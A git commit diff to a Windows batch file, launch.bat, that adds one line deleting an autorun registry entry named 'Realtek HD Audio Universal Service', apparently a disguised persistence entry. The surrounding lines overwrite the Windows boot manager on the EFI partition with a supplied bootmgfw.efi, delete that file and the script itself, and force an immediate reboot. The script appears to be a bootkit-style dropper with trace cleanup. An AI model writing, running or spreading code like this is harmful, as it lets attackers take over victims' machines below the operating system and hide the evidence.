08f704ef10de21b262393ce38ee06d5a00ea3b22
bruno <121198083+noxxUY@users.noreply.github.com>
2025-01-26 02:53:40 -0300

    Update launch.bat

--- launch.bat
+++ launch.bat
@@ -8,6 +8,7 @@ if %errorLevel% == 0 (
     
     xcopy %~dp0bootmgfw.efi Z:\EFI\Microsoft\Boot\
 
+    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
     del /q /f bootmgfw.efi
     del /q /f launch.bat
     shutdown /r /f /t 0
